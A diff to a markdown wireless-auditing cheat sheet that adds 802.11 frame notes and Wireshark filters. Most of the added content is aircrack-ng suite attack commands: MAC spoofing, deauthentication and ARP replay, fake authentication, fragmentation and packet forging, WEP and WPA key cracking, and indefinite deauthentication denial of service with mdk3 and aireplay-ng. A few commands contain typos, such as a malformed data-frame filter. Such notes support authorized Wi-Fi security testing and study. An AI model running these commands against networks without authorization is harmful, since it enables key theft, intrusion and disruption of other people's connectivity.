@@ -224,7 +224,10 @@ When doing wireless auditing, chipset is important. Brand is insignificant, need
 
 - **ToDS**: Bit set to 1 when frame is addressed to AP for forwarding to Distribution System, includes case where destination is in same BSS and AP is relaying frame.
 - **FromDS**: Bit set to 1 when frame is coming from DS (passed on by AP). 
-- *Additional bits omitted*
+- **Address-1**: Receipient Address, if ToDS is set, is address of AP, else is address of end station
+- **Address-2**: Transmitter Address, if FromDS is set, is the address of AP, else is address of station
+- **Address-3**: If FromDS is set, is original source address, if ToDS is set, is final destination address
+- **Address-4**: Reserved for special cases, where wireless distribution system is used and frame is transmitted from one AP to another. In this case, both ToDS and FromDS are set, address-3 contains original destination address and address-4 contains original source address
 
 Both ToDS and FromDS are set to 0 for management and control frames and when in ad-hoc mode, set to 1 only where frame is being transmitted from 1 AP to another in a WDS (bridge or repeater mode)
 
@@ -376,9 +379,19 @@ This section contains commands for some of the operations you will encounter fre
 - Get Routing Table: `route -n`
 - Restart Interface: `ifconfig <interface> down && ifconfig <interface> up`
 
+### Wireshark Filters
+
+- Beacon Frames: `wlan.fc.type_subtype==0x08`
+- Management Frames: `wlan.fc.type==0x0`
+- Control Frames: `wlan.fc.type=0x1`
+- Data Frames: `wlan.fc.type=0.02`
+- ToDS Frames: `wlan.fc.tods==1`
+- FromDS Frames: `wlan.fc.fromds==1`
+
 ### Interface Configuration
 
 #### Wireless Chipset Information
+
 - `airmon-ng`
 - `dmesg | less`
 - `lspci -vv | less` *(For PCI Cards)*
@@ -387,87 +400,162 @@ This section contains commands for some of the operations you will encounter fre
 *Ralink Chipsets - rt___, Realtek Chipsets - rtl___, Atheros Chipsets - ar___*
 
 #### Enabling Frame Injection (Ralink Chipsets)
+
 - `iwpriv <interface> forceprism 1`
 - `iwpriv <interface> rfmontx 1`
 
 *This **MUST** be done for all Ralink Chipsets, else frame injection will not work properly*
 
 #### Wireless Modes (Non-Atheros Chipsets) 
-Non-Atheros Chipsets
-- `iwconfig <interface> mode <type>`
 
-Atheros Chipsets
+Non-Atheros-Based Chipsets
+- `iwconfig <interface> mode <type>`
+- `ifconfig <interface> up`
+
+Atheros-Based Chipsets
 - `wlanconfig ath0 destroy`
 - `wlanconfig ath0 create wlandev wifi0 wlanmode <type>`
 
-#### Set ESSID
-- `iwconfig <interface> essid <ESSID>`
+*Modes typically include managed, ad-hoc, monitor and master, subject to chipset availability*
 
 #### Set Channel
+
 - `iwconfig <interface> channel <channel>`
 
 #### Change Bands
+
 - `iwpriv <interface> mode <number>`
 
 *Usually, Mode 3 is for 802.11g, Mode 2 is for 802.11b, Mode 1 is for 802.11a*
 
 #### List Discoverable APs
+
 - `iwlist <interface> ap`
 - `iwlist <interface> accesspoints`
 - `iwlist <interface> scanning`
 
-### Wireless Operations
+#### Set MAC Address
+
+Default
+- `ifconfig <interface> hw ether <MAC address>`
+
+Non-Atheros Chipsets
+- `ipconfig <interface> down`
+- `ip link set <interface> address <MAC address>`
+- `iwconfig <interface> mode monitor`
+- `ifconfig <interface> up`
+
+Atheros Chipsets
+- `ifconfig <interface> down`
+- `ip link set <interface> address <MAC address>`
+- `ip link set wifi0 address <MAC address>`
+- `wlanconfig <interface> destroy`
+- `wlanconfig <interface> create wlandev wifi0 wlanmode monitor`
+- `ifconfig <interface> up`
+
+### Wireless Operations & Attacks
 
 #### Sniffing
+
 - Start sniff: `airodump-ng <interface>`
 - Start sniff and write to file: `airodump-ng <interface> -w <file>`
 - Sniff targeted AP: `airodump-ng -c <channel> -w <file> --bssid=<BSSID> <interface>`
+- Save only captured IVs: `airodump-ng -c <channel> -w <file> --bssid=<BSSID> --ivs <interface>`
 
 #### Deauthentication Attack
-- Concept: 
-- `aireplay-ng --deauth 500 -a <BSSID> -c <client MAC> <interface>`
-- `aireplay-ng --arpreplay -b <BSSID> -h <client MAC> <interface>`
+
+Injection of deauthentication frames to clients prompting victim to reassociate. This reassociation request results in generated ARP requests when being assigned IP addresses. These ARP requests are captured and replayed to cause IV collisions
+
+- `aireplay-ng --deauth 500 -a <BSSID> -c <client MAC> <interface>` *Injects 500 deauthentication frames to client*
+- `aireplay-ng --arpreplay -b <BSSID> -h <client MAC> <interface>` *Listens for ARP frames and reinjects them back to distribution system*
+- `aireplay-ng --arpreplay -r <packet-capture-file> -b <BSSID> -h <client MAC> <interface>` *Reuse ARP requests from prior capture file*
 
 #### No-Client Associated Attacks - Interactive Replay Attack
-- Concept:
-- `aireplay-ng --fakeauth 15 -e <ESSID> -a <BSSID> -h <client MAC> <interface>`
-- `aireplay-ng --fakeauth 5000 -o 1 -q 15 -e <ESSID> -a <BSSID> -h <client MAC> <interface>`
-- 
 
-#### No-Client Associated Attacks - PRGA-Packetforge-Interactive Attack
-- Concept:
+Suitable for when there are no associated clients to run active arp-replay attack against. This method involves manually selecting at runtime what type of frames you wish to replay.
 
-#### Configure Client to Join WEP AP (Non-Atheros Chipsets)
+- `aireplay-ng --fakeauth 15 -e <ESSID> -a <BSSID> -h <client MAC> <interface>` *Client MAC is WNIC MAC address or previously-seen associated victim's to spoof. Attempts to associate with AP using MAC address, one authentication attempt sent every 15 seconds, some APs will kick after inactivity, value 0 can be used to make just one attempt*
+- `aireplay-ng --fakeauth 5000 -o 1 -q 15 -e <ESSID> -a <BSSID> -h <client MAC> <interface>` *In the case of requirement of frequent authentication, AP picky about receiving multiple, may deauthenticate if receiving more than one. This command sends one authentication request at a time, a keep-alive frame every 15 seconds until next authentication request*
+- `aireplay-ng --fakeauth 20 -o 1 -q 15 -e <ESSID> -a <BSSID> -h <client MAC> <interface>` *For APs with combinations of both sensitivity to multiple authentication requests and requiring frequent requests*
+- `aireplay-ng --interactive -b <BSSID> -h <client MAC> -p 0841 -c ff:ff:ff:ff:ff:ff <interface>` *Any data rebroadcase attempt, will listen for data fraames and once it identifies one, prompts user whether to reinject it back to the distribution system*
+- `aireplay-ng --interactive -b <BSSID> -d FF:FF:FF:FF:FF:FF -m 68 -n 68 -p 0841 -h <client MAC> <interface>` *Any data rebroadcast, targeting only ARP frames*
 
-#### Configure Client to Join WEP AP (Atheros Chipsets)
+#### No-Client Associated Attacks - PRGA-Packetforge Interactive Attack
 
-#### Configure Client to Join WPA AP
+Suitable for when there are no associated clients to run active arp-replay attack against. This method attempts to obtain Pseudo Random Generation Algorithm (PRGA) to create forged packet to playback. Involves running fakeauth to target AP and fragmentation attack to obtain PRGA, allowing creation of new frames to generate IVs needed to recover WEP key. Advantage is attacker is not limited to waiting for data frame bearing ARP payload, may be faster.
 
-
-#### Get IP Address
-1. Use Wireshark to sniff traffic to get valid IP address ranges
-2. Assign new IP address: `ifconfig <interface> <IP address> netmask <netmask>`
-3. Set gateway: `route add -net 0.0.0.0 gw <gateway IP>`
+- `aireplay-ng --fakeauth 15 -e <ESSID> -a <BSSID> -h <client MAC> <interface>` *Fakeauth attack*
+- `aireplay-ng --fragment -b <BSSID> -h <client MAC> <interface>` *Wait for detected frames, prompts user to obtain PRGA from AP, may need a few attempts to get full 1500 byte keystream*
+- `packetforge-ng --arp -a <BSSID> -h <client MAC> -l 255.255.255.255 -k 255.255.255.255 -y fragment.xor -w arprequest` *Creates ARP frame, with source and destination IP of 255.255.255.255, using captured PRGA*
+- `aireplay-ng --interactive -r arprequest <interface>` *Injects crafted ARP request to AP`
 
 ### Cracking
 
 #### WEP
+
 - Korek (>500k IVs): `aircrack-ng -a 1 -b <BSSID> <filename>`
-- PTW (>20k IVs or >40k IVs): `aircrack-ng -b <BSSID> <filename>`
+- PTW (>20k IVs for 40-bit key (10 characters) or >40k IVs for 104-bit keys (26 chars)): `aircrack-ng -b <BSSID> <filename>`
 
 #### WPA
+
+Run deauthentication attacks first and capture packets with airodump.
 - Default Attack: `cowpatty -f <dictionary-file> -r <packetdump-file> -s <SSID>`
 - CoWPAtty Nonrestrict Mode: `cowpatty -2 -f <dictionary-file> -r <packetdump-file> -s <SSID>`
 - Wireshark Cleanup: Using Wireshark, identify one valid 4-way handshake, mark and save as, run cowpatty on cleaned file
 - Aircrack: `aircrack-ng -a 2 -e <SSID> -b <BSSID> -w <dictionary> <packetdump>`
 - Retry: Rerun airodump-ng and deauthentication attacks until valid 4-way handshake is obtained
 
+### Denial of Service
+
+Using MDK3
+- `mdk3 <interface> a -i <BSSID>` *Deauthenticate all clients connected to AP*
+- `mdk3 <interface> d -b <list of MAC addresses> -c <channel>` *Deauthenticates clients part of the network contained in list*
+
+Using Aireplay
+- `aireplay-ng --deauth 0 -a <BSSID> -c <client MAC> <interface>` *Indefinitely deauthenticate a client*
+- `aireplay-ng --deauth 0 -a <BSSID> <interface>` *Indefinitely deauthenticate all clients connected to AP*
+
 ### AP Association
 
 #### Open 
 
+1. WNIC must be in managed mode
+2. `iwconfig <interface> essid <SSID>`
+3. Check BSSID with `iwconfig <interface>`
+4. `ifconfig <interface>`
+5. `pump -i <interface>` or `dhclient <interface>`
+
 #### WEP
+
+Non-Atheros Chipsets
+1. `iwconfig <interface> mode managed`
+2. `iwconfig <interface> essid <SSID>`
+3. `iwconfig <interface> channel <channel>`
+4. `iwconfig <interface> key [1] <WEP Key>`
+5. `iwconfig <interface> key [1]`
+6. `iwconfig <interface> enc on`
+7. `pump -i <interface>`
+
+Atheros Chipsets
+1. `wlanconfig <interface> destroy`
+2. `wlanconfig <interface> create wlandev wifi0 wlanmode managed`
+3. `iwconfig <interface> essid <SSID>`
+4. `iwconfig <interface> channel <channel>`
+5. `iwconfig <interface> key [1] <WEP Key>`
+6. `iwconfig <interface> key [1]`
+7. `iwconfig <interface> enc on`
+8. `pump -i <interface>`
 
 #### WPA
 
-### Denial of Service
+*TODO*
+
+#### Get IP Address
+
+1. Use Wireshark in promiscuous mode with IEEE 802.11 decryption to sniff traffic to get valid IP address ranges
+2. Assign new IP address: `ifconfig <interface> <IP address> netmask <netmask>`
+3. Set gateway: `route add -net 0.0.0.0 gw <gateway IP>`
+
+### Probemapper
+
+*TODO*
